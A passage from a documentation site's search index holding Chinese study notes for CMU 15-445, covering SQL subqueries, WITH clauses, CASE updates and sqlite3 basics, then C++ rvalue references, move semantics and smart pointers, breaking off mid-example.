<p>\u540c\u65f6\u4e3a\u4e86\u9632\u6b62\u591a\u5c42\u7684\u5d4c\u5957\u4f7f\u5f97\u53ef\u8bfb\u6027\u4e25\u91cd\u4e0b\u964d\uff0c\u6211\u4eec\u53ef\u4ee5\u7528WITH\u8bed\u53e5\u7ed9\u5b50\u67e5\u8be2\u4e00\u4e2a\u540d\u79f0\uff0cwith\u8bed\u53e5\u53ef\u4ee5\u540c\u65f6\u5b9a\u4e49\u591a\u4e2a</p> <pre><code>WITH courseEnrollment(num1, name, students) AS (\n    SELECT c.num AS num1, c.name, e.num AS num2, e.students\n    FROM courses AS c INNER JOIN enrollment AS e\n    ON c.num = e.num;\n)\nSELECT num1, name, students\nFROM courseEnrollment\nWHERE students &gt; 700;\n</code></pre> <ul> <li>FROM  \u53ea\u8981\u4ea7\u751f\u7684\u662f\u5173\u7cfb\u5373\u53ef</li> <li>WHERE  \u53ef\u4ee5\u66ff\u6362\u6210 B operation subquery  operation \u5e38\u7528 in \u548c not in</li> <li>SELECT  \u9700\u8981\u662f\u4e00\u4e2asingle value</li> </ul> <pre><code>select distinct course_id\nfrom section\nwhere semester = \u2019Fall\u2019 and year = 2009 and\ncourse_id in (  select course_id\n                from section\n                where semester = \u2019Spring\u2019 and year= 2010\n              );\n</code></pre> <p>in\u7684\u524d\u540e\u4e5f\u53ef\u4ee5\u662f\u5c5e\u6027\u7684\u96c6\u5408\uff0c\u53ea\u8981\u4e00\u4e00\u5bf9\u5e94\u5373\u53ef \u4f8b\u5982<code>(course_id,name) in (select course_id, name ...)</code>\u200b</p> <p>some</p> <p>some \u662f\u6307\u67d0\u4e2a\u7684\u610f\u601d</p> <pre><code>select *\nfrom section\nwhere id &gt; some (select id ...)\n</code></pre> <p>\u8fd9\u91cc\u53ea\u8981\u6211\u4eec\u7684id\u5927\u4e8e\u540e\u9762\u8fd9\u4e2a\u5b50\u67e5\u8be2\u4ea7\u751f\u7684id\u5217\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\u503c\u5373\u53ef\uff0coperation\u5e76\u4e0d\u4ec5\u9650\u4e8e&gt; \u53ef\u4ee5\u662f &lt;, =, !=, &gt;=, &lt;=</p> <p>= some() \u4e5f\u5c31\u662f\u5b58\u5728\u4e00\u4e2a\u76f8\u7b49\u5373\u53ef</p> <p>all</p> <p>\u4e0esome\u76f8\u5bf9\u5e94\uff0c\u505a\u6cd5\u5b8c\u5168\u76f8\u540c\uff0c\u8981\u6c42id\u5927\u4e8e\u6240\u6709\u5b50\u67e5\u8be2\u4e2d\u7684id</p> <p>exists \u548c not exists</p> <pre><code>select course_id\nfrom section AS S   \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684S\u53ef\u4ee5\u5728\u5b50\u67e5\u8be2\u91cc\u4f7f\u7528\uff0c\u4e0e\u5b50\u67e5\u8be2\u91cc\u7684section\u533a\u5206\nwhere semester='Falls' and year = 2017 and exists(\u5b50\u67e5\u8be2)\n</code></pre> <p>\u6ce8\u610f\u5b50\u67e5\u8be2\u4f7f\u7528\u7684S\u5df2\u7ecf\u7ecf\u8fc7\u524d\u9762\u7684\u7b5b\u9009\uff0c\u5b50\u67e5\u8be2\u4e0d\u4e3a\u7a7a\u5373\u53ef</p> <p>unique</p> <p>uniue\u7528\u6cd5\u548cexists\u7b49\u7528\u6cd5\u76f8\u540c\uff0c\u9488\u5bf9\u540e\u9762\u7684table\uff0c\u82e5\u5176\u6709\u91cd\u590d\u5143\u7ec4\uff0c\u5219\u8fd4\u56defalse\uff1b\u53cd\u4e4b\u5219\u4e3atrue</p> <p>except \u4e0e \u5173\u7cfb\u4ee3\u6570\u4e2d\u7684 '-' \u6b63\u4ea4</p> <p>as\u53ef\u4ee5\u5bf9\u4e8e\u5217\u4e5f\u540c\u65f6\u91cd\u547d\u540d</p> <pre><code>(\u5b50\u67e5\u8be2) as table(a1,a2)\n</code></pre> <p>scalar \u6807\u91cf\u5b50\u67e5\u8be2\uff0c\u6307\u7684\u662f\u6307\u8fd4\u56de\u4e00\u4e2avalue\u7684\u60c5\u5f62</p> <pre><code>select dept_name, (select count(*) from instructor\n                    where department.dept_name = instructor.dept_name ) \n                    as num_instructors\nfrom department;\n</code></pre> <p>\u8fd9\u91cc\u7684select\u91cc\u9762\u5c31\u4e0d\u662f\u4e00\u4e2a\u5c5e\u6027\uff0c\u5355\u7eaf\u662f\u4e00\u4e2a\u503c\uff0c\u5e76\u4e14\u8fd9\u4e2a\u5b50\u67e5\u8be2\u8fd4\u56de\u7684value\u53ea\u80fd\u662f\u4e00\u4e2a\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u4e0d\u9700\u8981some\uff0call\u505a\u6bd4\u8f83</p> <p>in and not in</p> <p>\u8be5\u7279\u5b9a\u7684\u8bb0\u5f55\u662f\u5426\u5728\u5b50\u67e5\u8be2\u4e2d\u5b58\u5728\u8fc7</p> <p>\u53ef\u4ee5\u7528some, all, any \u66ff\u4ee3\uff0c\u5f62\u4f3c\u8bed\u6cd5\u7cd6</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#update","title":"update","text":"<p>case\u8bed\u53e5*</p> <p>case\u8bed\u53e5\u53ef\u4ee5\u6784\u6210\u5206\u6bb5\u7684\u64cd\u4f5c\uff0c\u9002\u7528\u4e8eupdate\u8bed\u53e5\uff0c\u4f8b\u5982</p> <pre><code>update works\nset salary = case\n    when salary &lt;= 100000 then salary * 1.1\n    else salary * 1.03\n    end\nwhere company_name = \"First Bank Cororation\" and ID = some (select ID from manages)\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#sql_2","title":"\u9519\u8bef\u7684SQL","text":"<p>\u6700\u540eSQL\u7684\u7ed3\u679c\u662f\u7531SELECT\u8bed\u53e5\u786e\u5b9a\uff0c\u6211\u4eec\u9700\u8981\u786e\u5b9a\u7684\u662f\uff0c\u8fd9\u91cc\u9762\u6240\u6709\u7684columns\u62e5\u6709\u76f8\u540c\u6570\u91cf\u7684rows\uff0c\u4f8b\u5982\u5bf9\u4e8e\u4e0a\u8ff0\u8fd9\u4e2a\u4f8b\u5b50</p> <pre><code>SELECT age , num dogs           5\nFROM Person                     1\nWHERE age &gt;= 18                 2\nGROUP BY age                    3\nHAVING COUNT( \u2217 ) &gt; 1 ;\n</code></pre> <p>\u5982\u679c\u4e0d\u52a0\u4e0aAVG\uff0c\u90a3\u4e48\u5c31\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3aage\u5176\u5b9e\u5df2\u7ecf\u88ab\u5212\u5206\u4e86\uff0c\u6240\u6709\u76f8\u540c\u6570\u503c\u7684age\u88ab\u5212\u5206\u6210\u4e86\u4e00\u4e2a\uff0c\u4f46nums_dogs\u5e76\u672a\u88ab\u5212\u5206\uff0c\u56e0\u6b64\u4f1a\u5bfc\u81f4\u6570\u91cf\u4e0d\u5bf9\u9f50</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/SQL/#dbms-sqlite","title":"DBMS \u4f7f\u7528 \u4ee5sqlite\u4e3a\u4f8b","text":"<p>\u73af\u5883\uff1aUbuntu2204 sqlite3</p> <p>\u6253\u5f00\u7684\u65b9\u5f0f <code>sqlite3 file.db</code>\u200b   \u9000\u51fa\u7ec8\u7aef  ctrl-d</p> <p>\u4e00\u4e2adb\u6587\u4ef6\u5728DBMS\u89c6\u89d2\u4e0b\u4e00\u822c\u7531\u591a\u4e2atable\u6784\u6210\uff0c\u53ef\u4ee5\u7528<code>.table</code>\u200b\u7684\u6307\u4ee4\u67e5\u770b\u6240\u6709\u7684table</p> <ul> <li>\u200b<code>.schema tablename</code>\u200b\u200b \u6765\u67e5\u770b\u6bcf\u4e2atable\u7684attributes</li> <li>\u53ef\u4ee5\u76f4\u63a5\u5728\u7ec8\u7aef\u7f16\u5199sql \u67e5\u8be2\uff0c\u8981\u8bb0\u5f97\u5728\u7ed3\u5c3e\u52a0\u4e0a\u2018\uff1b\u2019\u4f5c\u4e3a\u4e00\u4e2asql\u67e5\u8be2\u6307\u4ee4\u7684\u7ed3\u5c3e</li> <li>\u200b<code>.read sqlfilename</code>\u200b\u200b \u591a\u6570\u65f6\u5019\u6211\u4eec\u628asql\u6587\u4ef6\u5199\u5728\u5916\u9762\uff0c\u53ef\u4ee5\u901a\u8fc7.read\u6307\u4ee4\u76f4\u63a5\u8c03\u7528\u5916\u90e8sql\u6587\u4ef6\u91cc\u7684sql\u6307\u4ee4</li> </ul> <p>\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93</p> <p>\u200b<code>touch test.db</code>\u200b</p> <ul> <li>\u8868\u7684\u521b\u5efa  </li> </ul> <p><pre><code>sqlite&gt; CREATE TABLE COMPANY(\n   ID INT PRIMARY KEY     NOT NULL,\n   NAME           TEXT    NOT NULL,\n   AGE            INT     NOT NULL,\n   ADDRESS        CHAR(50),\n   SALARY         REAL\n);\n</code></pre> * \u8868\u7684\u63d2\u5165  </p> <pre><code>INSERT INTO COMPANY (ID,NAME,AGE,ADDRESS,SALARY)\nVALUES (1, 'Paul', 32, 'California', 20000.00 );\n</code></pre> <p>\u6570\u636e\u5e93\u4e2d\u7684\u4e3b\u952e</p> <pre><code>/**\n                 * \u5bf9\u4e8e\u4e0d\u5b58\u5728\u6570\u636e\u53ef\u4ee5\u76f4\u63a5\u5728values\u91cc\u9762\u63d2\u5165default\n                 * */\n</code></pre> <p>\u6570\u636e\u5e93\u4e2d\u7684\u589e\u5220\u67e5\u6539</p> <p>\u8be6\u89c1project</p> <ul> <li>deletion   <code>delete from xxx where xxx</code>\u200b</li> <li>insert  <code>insert into xxx (....) values (....)</code>\u200b  value\u53ef\u4ee5\u7528null\u4e5f\u53ef\u4ee5\u7528default  \u63d2\u5165\u4e5f\u53ef\u4ee5\u548cselect\u7ed3\u5408\u8d77\u6765 \u89c1PPT</li> <li>update <code>update instructor set salary = salary * 1.05</code>\u200b   \u8fd9\u91cc\u9762\u7684\u6570\u636e\u53ef\u4ee5\u7528\u5d4c\u5957\u5b50\u67e5\u8be2\u66ff\u6362\uff0c\u5b9e\u73b0\u66f4\u52a0\u590d\u6742\u7684update</li> </ul> <p>\u200d</p> <p>\u200d</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/advanced%20C%2B%2B/","title":"advanced C++","text":"<p>\u4e3a\u4e86\u8fd9\u95e8\u8bfe\u7684\u5b66\u4e60\u9700\u8981\u4e00\u4e9bC++\u8fdb\u9636\u7684\u77e5\u8bc6\uff0c\u5305\u62ec\u5e76\u53d1\u548c\u667a\u80fd\u6307\u9488\u7684\u90e8\u5206\uff0c\u8fd9\u4e9b\u4e4b\u524d\u7528\u7684\u5f88\u5c11\uff0c\u56e0\u6b64\u9700\u8981\u5b66\u4e60\u4e00\u4e0b\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/advanced%20C%2B%2B/#_1","title":"\u53f3\u503c\u5f15\u7528","text":"<p>\u53c2\u8003\u8d44\u6599\uff1a\u5bf9C++11\u4e2d\u7684<code>\u79fb\u52a8\u8bed\u4e49</code>\u4e0e<code>\u53f3\u503c\u5f15\u7528</code>\u7684\u4ecb\u7ecd\u4e0e\u8ba8\u8bba - \u5f20\u6d6e\u751f - \u535a\u5ba2\u56ed (cnblogs.com)</p> <pre><code>void func(int&amp; x){cout&lt;&lt;\"hello\"&lt;&lt;endl;}\nint main()\n{\n    int x=0;\n    int y=0;\n    func(x);    \u6b63\u786e\n    func(x+y);  \u9519\u8bef\n    func(1);    \u9519\u8bef\n}\n</code></pre> <p>\u7531\u4e0a\u8ff0\u4ee3\u7801\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u7684\u5f15\u7528\u53ea\u80fd\u5bf9\u5de6\u503c\u8fdb\u884c\u5f15\u7528\uff0c\u6240\u8c13\u5de6\u503c\u6211\u4eec\u53ef\u4ee5\u7528\u8fd9\u4e2a\u503c\u80fd\u4e0d\u80fd\u51fa\u73b0\u5728\u7b49\u5f0f\u7684\u5de6\u8fb9\u6765\u5224\u65ad\u3002</p> <p>\u5982\u679c\u5c06func\u51fd\u6570\u7684\u53c2\u6570\u6539\u4e3a <code>int&amp;&amp; x</code>\u200b \u8fd9\u540e\u9762\u4e24\u4e2a\u8bed\u53e5\u5c31\u53ef\u4ee5\u6267\u884c\uff0c\u7b2c\u4e00\u6761\u53cd\u800c\u4e0d\u80fd\u6267\u884c\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5f53\u51fd\u6570\u53c2\u6570\u4e2d\u51fa\u73b0\u5f15\u7528\u7684\u65f6\u5019\uff0c\u591a\u6570\u65f6\u5019\u4e5f\u9700\u8981\u4e00\u4e2a\u53f3\u503c\u5f15\u7528\u7684\u51fd\u6570\u4f5c\u4e3a\u91cd\u8f7d\u8f85\u52a9\u3002</p> <p>\u800c\u53f3\u503c\u5f15\u7528\u6709\u4e00\u4e2a\u7279\u70b9\uff0c\u4e5f\u5373\u5176\u5bf9\u8c61\u5f80\u5f80\u662f\u4e00\u4e2a\u4e34\u65f6\u7684\u53d8\u91cf\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u5728\u505a\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u540c\u6837\u9700\u8981\u4e00\u4e2a\u53f3\u503c\u7684\u91cd\u8f7d\uff0c\u4f46\u662f\u5bf9\u4e8e\u8fd9\u6837\u4e00\u4e2a\u51fd\u6570\u800c\u8a00\uff0c\u50cf\u4e00\u822c\u7684\u6df1\u62f7\u8d1d\u90a3\u6837\uff0cnew\u4e00\u5757\u5185\u5b58\u62f7\u8d1d\u8fdb\u53bb\u662f\u4e00\u79cd\u76f8\u5f53\u7684\u6d6a\u8d39\uff0c\u6211\u4eec\u5f80\u5f80\u4f1a\u8fd9\u6837\u505a\uff08Most typically, this rvalue will be a literal or temporary value. \u5b57\u9762\u503c\u6216\u8005\u4e34\u65f6\u53d8\u91cf\uff09</p> <pre><code>string(string&amp;&amp; that)   // string&amp;&amp; is an rvalue reference to a string\n    {\n        data = that.data;\n        that.data = nullptr;\n    }\n</code></pre> <p>\u5047\u8bbestring\u5185\u90e8\u662f\u7528\u4e00\u4e2adata\u6307\u9488\u7ba1\u7406\u6570\u7ec4\uff0c\u6211\u4eec\u5b8c\u5168\u4e0d\u9700\u8981new\u4e00\u5757\u5185\u5b58\u518d\u4e00\u4e00\u505a\u62f7\u8d1d\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u8fd9\u5757\u5185\u5b58\u62ff\u8fc7\u6765\uff0c\u5e76\u4e14\u5c06\u4e34\u65f6\u53d8\u91cf\u7684\u90a3\u90e8\u5206\u4fee\u6539\u6210nullptr\uff0c\u56e0\u4e3a\u5176\u4e4b\u540e\u9a6c\u4e0a\u4f1a\u88ab\u9500\u6bc1\u3002</p> <p>\u53f3\u503c\u5f15\u7528\u7684\u672c\u8d28\u662f\u521b\u5efa\u4e00\u4e2a\u5f15\u7528\uff0c\u6765\u5ef6\u957f\u4e34\u65f6\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f \uff1f</p> <pre><code>int&amp;&amp; x {2};\nx=10;\ncout&lt;&lt;x&lt;&lt;endl; \u8f93\u51fa10\n</code></pre> <p>\u4e0a\u8ff0\u8fd9\u4e2a\u4f8b\u5b50\u770b\u4f3c\u6709\u70b9\u5947\u602a\uff0c\u4f3c\u4e4e\u6211\u4eec\u662f\u5bf9\u8fd9\u4e2a\u5b57\u9762\u503c\u505a\u4e86\u5f15\u7528\uff0c\u5176\u5b9e\u5e94\u8be5\u7406\u89e3\u4e3a\u5bf9<code>int(2)</code>\u200b\u8fd9\u4e2a\u4e34\u65f6\u53d8\u91cf\u505a\u4e86\u53f3\u503c\u5f15\u7528</p> <p>\u5bf9\u4e8e\u8fd9\u4e9b\u53f3\u503c\uff0c\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u7528const\u7684\u5de6\u503c\u5f15\u7528\u6765\u63a5\u6536</p> <p>\u6709\u4e00\u4e2a\u6bd4\u8f83tricky\u7684\u73b0\u8c61\u662f\uff1a\u53f3\u503c\u5f15\u7528\u672c\u8eab\u662f\u5de6\u503c</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/advanced%20C%2B%2B/#_2","title":"\u79fb\u52a8\u8bed\u4e49\u548c\u667a\u80fd\u6307\u9488","text":"<p>\u53c2\u8003\u8d44\u6599\uff1a22.1 \u2014 Introduction to smart pointers and move semantics \u2013 Learn C++ (learncpp.com)</p> <p>\u9700\u8981\u667a\u80fd\u6307\u9488\u7684\u539f\u56e0</p> <ul> <li>\u5f53\u53d8\u91cf\u79bb\u5f00\u4f5c\u7528\u57df\u7684\u65f6\u5019\u4f1a\u8c03\u7528\u6790\u6784\u51fd\u6570\uff0c\u4f46\u5728\u6307\u9488\u79bb\u5f00\u7684\u65f6\u5019\u5374\u4e0d\u4f1a\u81ea\u52a8\u8c03\u7528delete</li> <li>\u6df1\u5ea6\u62f7\u8d1d\u7684\u8fc7\u7a0b\u662f\u6d6a\u8d39\u7684</li> </ul> <p>\u79fb\u52a8\u8bed\u4e49(move semantics)\u7684\u672c\u8d28\u5728\u4e8e\u8f6c\u79fb\u6240\u6709\u6743(ownership)\uff0c\u800c\u4e0d\u662f\u505a\u62f7\u8d1d\u6216\u8d4b\u503c\uff0cC++\u7684\u8981\u6c42\u662f\u5c3d\u53ef\u80fd\u5730\u9ad8\u6027\u80fd\uff0c\u5bf9\u4e8e\u5de6\u503c\u624d\u505a\u62f7\u8d1d\uff0c\u5bf9\u4e8e\u53f3\u503c\u4ec5\u505a\u79fb\u52a8</p> <pre><code>Auto_ptr2(Auto_ptr2&amp; a) // note: not const\n    {\n        m_ptr = a.m_ptr; // transfer our dumb pointer from the source to our local object\n        a.m_ptr = nullptr; // make sure the source no longer owns the pointer\n    }\n\n    // An assignment operator that implements move semantics\n    Auto_ptr2&amp; operator=(Auto_ptr2&amp; a) // note: not const\n    {\n        if (&amp;a == this)\n            return *this;\n\n        delete m_ptr; // make sure we deallocate any pointer the destination is already holding first\n        m_ptr = a.m_ptr; // then transfer our dumb pointer from the source to the local object\n        a.m_ptr = nullptr; // make sure the source no longer owns the pointer\n        return *this;\n    }\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u662f\u4e00\u4e2a\u6211\u4eec\u7b80\u5199\u7684\u667a\u80fd\u6307\u9488\u7684\u62f7\u8d1d\u548c\u8d4b\u503c\u91cd\u5199\uff0c\u5176\u6838\u5fc3\u601d\u60f3\u662f\uff0c\u667a\u80fd\u6307\u9488\u7684\u8d4b\u503c\u548c\u62f7\u8d1d\uff0c\u5e76\u4e0d\u4f1a\u9020\u6210\u5176\u6240\u6307\u5411\u5bf9\u8c61\u7684\u62f7\u8d1d\uff0c\u6240\u6307\u5411\u7684\u5bf9\u8c61\u6c38\u8fdc\u53ea\u6709\u4e00\u4efd\uff0c\u8fd9\u4efd\u4ee3\u7801\u7684\u5b9e\u73b0\u7c7b\u4f3c\u4e0e\u65e9\u671fC++\u4e2d\u7684 <code>std::auto_ptr</code>\u200b\uff0c\u5b83\u6709\u5f88\u591a\u7684\u95ee\u9898\uff0c\u4f8b\u5982\u5728\u4e0a\u8ff0\u5b9e\u73b0\u4e2d\uff0c\u4f60\u4f1a\u53d1\u73b0\u5982\u679c\u4f60\u628a\u667a\u80fd\u6307\u9488\u4f20\u5165\u51fd\u6570\u4e2d\uff08\u53d1\u751f\u62f7\u8d1d\u6784\u9020\uff09\uff0c\u539f\u672c\u7684\u667a\u80fd\u6307\u9488\u5c45\u7136\u5728\u53d1\u751f\u62f7\u8d1d\u540e\u65e0\u6548\u4e86\uff0c\u8fd9\u663e\u7136\u662f\u4e0d\u80fd\u63a5\u53d7\u7684\u3002</p> <p>\u4e0a\u8ff0\u6307\u9488\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u53ea\u80fd\u53d1\u751f\u79fb\u52a8\uff0c\u4e0d\u80fd\u53d1\u751f\u62f7\u8d1d\uff0c\u800c\u6709\u4e9b\u667a\u80fd\u6307\u9488\u9700\u8981\u517c\u987e\u4e8c\u79cd\u529f\u80fd\u3002\u800c\u5f53C++11\u5f15\u5165\u53f3\u503c\u5f15\u7528\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u505a\u5230\u3002</p> <p>\u5bf9\u4e8e\u51fd\u6570\u8fd4\u56de\u503c\u800c\u8a00</p> <ul> <li>The C++ specification has a special rule that says automatic objects returned from a function by value can be moved even if they are l-values.</li> </ul> <p>\u79fb\u52a8\u8bed\u4e49\u7684\u5e94\u7528\u573a\u5408</p> <ul> <li>\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5927\u7684\u5bf9\u8c61\u65f6\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u751f\u547d\u5468\u671f\u5728\u51fd\u6570\u5185\u90e8</li> <li>\u4ea4\u6362\u4e24\u4e2a\u5bf9\u8c61\u7684\u5185\u5bb9\uff0c\u5b9e\u9645\u4e0a\u53ea\u9700\u8981\u4ea4\u6362\u6240\u6709\u6743\u5c31\u53ef\u4ee5\uff0c\u4f46\u662f\u56e0\u4e3a\u8fd9\u79cd\u573a\u5408\u4e0b\u4e24\u4e2a\u5bf9\u8c61\u5f80\u5f80\u4e0d\u662f\u53f3\u503c\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4f7f\u7528<code>std::move</code>\u200b\u200b\uff0c\u5176\u53ef\u4ee5\u5c06\u5de6\u503c\u9759\u6001\u8f6c\u6362\u6210\u53f3\u503c\uff0c\u5373\u53ef\u89e6\u53d1\u79fb\u52a8\u6784\u9020\u51fd\u6570\u548c\u79fb\u52a8\u8d4b\u503c\u51fd\u6570  </li> </ul> <p><pre><code>#include &lt;utility&gt; // for std::move\ntemplate&lt;class T&gt;\nvoid myswapMove(T&amp; a, T&amp; b)\n{\n  T tmp { std::move(a) }; // invokes move constructor\n  a = std::move(b); // invokes move assignment\n  b = std::move(tmp); // invokes move assignment\n}\n</code></pre> * \u4efb\u4f55\u53ef\u4ee5\u505a\u79fb\u52a8\u4ee3\u66ff\u62f7\u8d1d\u7684\u60c5\u51b5\u4e0b\uff0c\u90fd\u5e94\u8be5\u91c7\u7528\u79fb\u52a8\u63d0\u9ad8\u6548\u7387\uff0c\u4f8b\u5982<code>vec.push_back(std::move(x));</code>\u200b\u505a\u79fb\u52a8\u800c\u4e0d\u505a\u62f7\u8d1d\uff0c\u6548\u7387\u66f4\u9ad8\u3002\u4f46\u662f\u8981\u6ce8\u610f\u7684\u662f\u88abmove\u7684\u8fd9\u4e2a\u53d8\u91cf\u4e0d\u80fd\u518d\u8c03\u7528\u4efb\u4f55\u6709\u5173\u4e8e\u5176\u5185\u5bb9\u7684\u65b9\u6cd5\uff0c\u76f4\u5230\u5176\u88ab\u518d\u6b21\u8d4b\u503c\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/cmu15445/advanced%20C%2B%2B/#_3","title":"\u6807\u51c6\u5e93\u7684\u667a\u80fd\u6307\u9488","text":"<p>\u667a\u80fd\u6307\u9488\u5b58\u5728\u7684\u9996\u8981\u76ee\u6807\u662f\u4fdd\u8bc1\u7ef4\u62a4\u7684\u5bf9\u8c61\u5728\u79bb\u5f00\u667a\u80fd\u6307\u9488\u7ba1\u7406\u7684\u8303\u56f4\u4e4b\u540e\u6b63\u786edelete\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4e0d\u5e94\u8be5\u5bf9\u667a\u80fd\u6307\u9488\u52a8\u6001\u5206\u914d\u5185\u5b58</p> <pre><code>#include &lt;memory&gt; // for std::unique_ptr\n#include &lt;utility&gt; // for std::move\nstd::unique_ptr&lt;Resource&gt; res1{ new Resource() };\nstd::unique_ptr&lt;Resource&gt; res2{}; // Start as nullptr\nres2 = std::move(res1); // res2 assumes ownership, res1 is set to null\n</code></pre> <p>\u8fd9\u4e9b\u667a\u80fd\u6307\u9488\u90fd\u91cd\u8f7d\u6307\u9488\u76f8\u5e94\u7684\u64cd\u4f5c\u7b26 Operator* returns a reference to the managed resource, and operator-&gt; returns a pointer.</p> <p>\u5f53\u672a\u7ed9\u667a\u80fd\u6307\u9488\u5206\u914d\u5bf9\u8c61\u6216\u8005\u662f\u5bf9\u8c61\u88abmover\u7ed9\u4e86\u5176\u4ed6\u7684\u6307\u9488\u7684\u65f6\u5019\uff0c\u5176\u8bbe\u8ba1\u4fdd\u8bc1\u6b64\u65f6\u7684\u667a\u80fd\u6307\u9488\u8868\u73b0\u4e3a\u7a7a\u6307\u9488\u7684\u6027\u8d28</p> <pre><code>if (res) // use implicit cast to bool to ensure res contains a Resource\n    std::cout &lt;&lt; *res &lt;&lt; '\\n'; // print the Resource that res is owning\n</code></pre> <p>\u73b0\u4ee3\u667a\u80fd\u6307\u9488\u90fd\u53ef\u4ee5\u7ba1\u7406\u5355\u4e2a\u5bf9\u8c61\u548c\u6570\u7ec4\u5bf9\u8c61\uff0c\u4f46\u662f\u5bf9\u4e8e\u6570\u7ec4\u800c\u8a00std::array and std::vector\u51e0\u4e4e\u6c38\u8fdc\u662f\u66f4\u597d\u7684\u9009\u62e9</p> <p>\u667a\u80fd\u6307\u9488\u7684\u521b\u5efa</p> <p>\u5728C++14\u4e4b\u540e\uff0c\u6211\u4eec\u4f1a\u66f4\u503e\u5411\u4e8e\u7528\u4e00\u4e9b\u7279\u5b9a\u7684\u51fd\u6570\u6765\u521b\u9020\u667a\u80fd\u6307\u9488\u800c\u4e0d\u662f\u50cf\u4e0a\u9762\u7684\u4f8b\u5b50\u4e00\u6837\u76f4\u63a5new\uff0ctips\uff1a\u76f4\u63a5new\u7684\u5199\u6cd5\u4f1a\u5b58\u5728\u4e00\u4e9b\u8f83\u4e3a\u7279\u6b8a\u7684\u60c5\u51b5\u53d1\u751f\u5185\u5b58\u6cc4\u9732</p> <pre><code>// Create a single dynamically allocated Fraction with numerator 3 and denominator 5\n// We can also use automatic type deduction to good effect here\nauto f1{ std::make_unique&lt;Fraction&gt;(3, 5) };\n// Create a dynamically allocated array of Fractions of length 4\nauto f2{ std::make_unique&lt;Fraction[]&gt;(4) };\n\nauto f3{std::make_shared&lt;Fraction&gt;(3,5)};\n</code></pre> <p>\u667a\u80fd\u6307\u9488\u4f5c\u4e3a\u51fd\u6570\u8fd4\u56de\u503c</p> <p>\u5728\u6b63\u5e38\u7684\u8bbe\u8ba1\u4e0b\uff0c\u4e00\u822c\u8be5\u79cd\u60c5\u51b5\u6bd4\u8f83\u5c11\u89c1</p> <pre><code>std::unique_ptr&lt;Resource&gt; createResource()\n{\n    return std::make_unique&lt;Resource&gt;();\n}\nauto ptr{ createResource() };\n</code></pre> <p>\u667a\u80fd\u6307\u9488\u4f5c\u4e3a\u51fd\u6570\u7684\u53c2\u6570</p> <p>\u8981\u6ce8\u610f\u7684\u662f\uff0cstd::unique_ptr\u4e0d\u652f\u6301\u62f7\u8d1d\u64cd\u4f5c\uff0c\u5176\u4f20\u503c\u7684\u65f6\u5019\u53ea\u80fd\u4f9d\u8d56std::move\u6216\u8005\u667a\u80fd\u6307\u9488\u672c\u8eab\u7684\u5f15\u7528\u3002\u6216\u8005\u8fd8\u6709\u4e00\u79cd\u65b9\u5f0f\u662f\u8c03\u7528\u667a\u80fd\u6307\u9488\u7684get()\u65b9\u6cd5\uff0c\u5c06\u8d44\u6e90\u672c\u8eab\u7684\u6307\u9488\u4f20\u5165\u51fd\u6570\u3002</p> <p>\u5bf9\u4e8estd::unique_ptr \u4e0d\u8981\u628a\u4e00\u4efd\u8d44\u6e90\u4f20\u7ed9\u4e24\u4e2a\u6307\u9488\uff0c\u7f16\u8bd1\u5668\u4e0d\u4f1a\u963b\u6b62\uff08\uff1f\uff1f\uff1f\uff09\u4f46\u662f\u4f1a\u9020\u6210\u6cc4\u9732\uff0c\u5982\u679c\u4f7f\u7528make_unique\u5c31\u4e0d\u4f1a\u6709\u4e0a\u8ff0\u95ee\u9898</p> <pre><code>Resource* res{ new Resource() };\nstd::unique_ptr&lt;Resource&gt; res1{ res };\nstd::unique_ptr&lt;Resource&gt; res2{ res };\n</code></pre> <p>std::shared_ptr</p> <p>\u4e0eunique\u7684\u6307\u9488\u4e0d\u540cshared_ptr\u652f\u6301\u591a\u4e2a\u667a\u80fd\u6307\u9488\u6307\u5411\u540c\u4e00\u8d44\u6e90\u76ee\u6807\u7684\u60c5\u51b5\uff0c\u4e5f\u5373\u652f\u6301\u62f7\u8d1d\u8bed\u4e49\u3002\u4f46\u662f\u9700\u8981\u660e\u786e\u7684\u662f\uff0c\u62f7\u8d1d\u8bed\u4e49\u9700\u8981\u5728\u53d1\u751f\u5728\u667a\u80fd\u6307\u9488\u4e4b\u95f4\uff0c\u800c\u4e0d\u662f\u8d44\u6e90\u4e4b\u95f4</p> <pre><code>\u9519\u8bef\u505a\u6cd5\nstd::shared_ptr&lt;Resource&gt; ptr1 { res };\nstd::shared_ptr&lt;Resource&gt; ptr2 { res 